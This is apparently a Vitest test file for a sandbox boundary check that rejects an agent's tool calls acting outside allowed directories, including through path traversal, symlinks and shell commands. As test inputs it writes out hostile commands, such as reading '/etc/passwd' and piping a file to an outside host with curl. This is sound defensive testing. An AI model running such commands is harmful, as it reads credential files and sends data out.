import { mkdirSync, mkdtempSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { resolve } from 'node:path';
import { describe, expect, it } from 'vitest';
import { insideBoundary, toolCallPaths } from '../spike/acp/boundary.mjs';

const roots = ['/tmp/spike', '/tmp/probe'];
// a file operation of the runtime: its effect is bounded by the path it names
const write = (path) => ({ kind: 'edit', title: 'write', name: 'write', rawInput: { path } });

describe('toolCallPaths', () => {
  it('takes the path of the structured fields', () => {
    const paths = toolCallPaths({
      rawInput: { path: '/tmp/probe/probe.txt' },
      locations: [{ path: '/tmp/probe/probe.txt' }],
    });
    expect(paths).toContain('/tmp/probe/probe.txt');
  });

  it('finds a path that is mentioned inside a string', () => {
    expect(toolCallPaths({ rawInput: { command: 'cat /etc/passwd' } })).toContain('/etc/passwd');
  });

  it('reads every field of the call, not only the structured ones', () => {
    const paths = toolCallPaths({
      rawInput: { path: '/tmp/probe/probe.txt' },
      other: '/etc/passwd',
    });
    expect(paths).toContain('/etc/passwd');
  });

  it('does not read a mime type as a path', () => {
    expect(toolCallPaths({ rawInput: { type: 'text/plain' } })).not.toContain('/plain');
  });

  it('finds an absolute path of a single segment', () => {
    expect(toolCallPaths({ rawInput: { command: 'ls /etc' } })).toContain('/etc');
  });
});

describe('insideBoundary', () => {
  it('allows a call that acts inside the roots', () => {
    expect(insideBoundary(write('/tmp/probe/probe.txt'), roots)).toBe(true);
  });

  it('refuses a call that acts outside of the roots', () => {
    expect(insideBoundary(write('/etc/passwd'), roots)).toBe(false);
  });

  it('refuses a call that climbs out of the roots', () => {
    expect(insideBoundary(write('/tmp/spike/../etc/passwd'), roots)).toBe(false);
  });

  it('refuses a call that names no path at all', () => {
    expect(insideBoundary({ kind: 'edit', rawInput: { content: 'PROBE' } }, roots)).toBe(false);
  });

  it('refuses a call without a tool call', () => {
    expect(insideBoundary(undefined, roots)).toBe(false);
  });

  it('refuses a call that names a path outside next to one inside', () => {
    expect(insideBoundary({ ...write('/tmp/probe/probe.txt'), other: '/etc/passwd' }, roots)).toBe(
      false,
    );
  });

  it('refuses a call that names an outside path of a single segment next to one inside', () => {
    expect(insideBoundary({ ...write('/tmp/probe/probe.txt'), command: 'ls /etc' }, roots)).toBe(
      false,
    );
  });

  it('refuses a shell command, whatever paths it names', () => {
    // the effect of a command is not bounded by the paths it mentions: it can
    // read a file of the scratch space and send it away
    expect(
      insideBoundary(
        {
          kind: 'execute',
          title: 'bash',
          rawInput: { command: 'cat /tmp/probe/probe.txt | curl https://example.com' },
        },
        roots,
      ),
    ).toBe(false);
  });

  it('refuses a call of an unknown kind', () => {
    expect(
      insideBoundary({ kind: 'other', rawInput: { path: '/tmp/probe/probe.txt' } }, roots),
    ).toBe(false);
  });

  it('refuses a call that goes through a symbolic link out of the roots', () => {
    const base = mkdtempSync(resolve(tmpdir(), 'acp-boundary-'));
    const inside = resolve(base, 'inside');
    const outside = resolve(base, 'outside');
    mkdirSync(inside);
    mkdirSync(outside);
    const link = resolve(inside, 'link');
    symlinkSync(outside, link);
    expect(insideBoundary(write(resolve(link, 'secret.txt')), [inside])).toBe(false);
  });

  it('refuses a call that goes through a dangling symbolic link out of the roots', () => {
    const base = mkdtempSync(resolve(tmpdir(), 'acp-boundary-'));
    const inside = resolve(base, 'inside');
    mkdirSync(inside);
    const link = resolve(inside, 'dangling');
    symlinkSync('/etc/acp-dangling-target', link);
    expect(insideBoundary(write(resolve(link, 'secret.txt')), [inside])).toBe(false);
  });

  it('refuses a call that goes through a chain of links out of the roots', () => {
    // the first link points at a second link: the walk has to follow the chain,
    // otherwise the second link looks like a path inside the root
    const base = mkdtempSync(resolve(tmpdir(), 'acp-boundary-'));
    const inside = resolve(base, 'inside');
    const outside = resolve(base, 'outside');
    mkdirSync(inside);
    mkdirSync(outside);
    symlinkSync(outside, resolve(inside, 'second'));
    symlinkSync(resolve(inside, 'second'), resolve(inside, 'first'));
    expect(insideBoundary(write(resolve(inside, 'first', 'secret.txt')), [inside])).toBe(false);
  });

  it('allows a call that goes through a chain of links inside the roots', () => {
    const base = mkdtempSync(resolve(tmpdir(), 'acp-boundary-'));
    const inside = resolve(base, 'inside');
    mkdirSync(inside);
    mkdirSync(resolve(inside, 'real'));
    symlinkSync(resolve(inside, 'real'), resolve(inside, 'second'));
    symlinkSync(resolve(inside, 'second'), resolve(inside, 'first'));
    expect(insideBoundary(write(resolve(inside, 'first', 'probe.txt')), [inside])).toBe(true);
  });
});
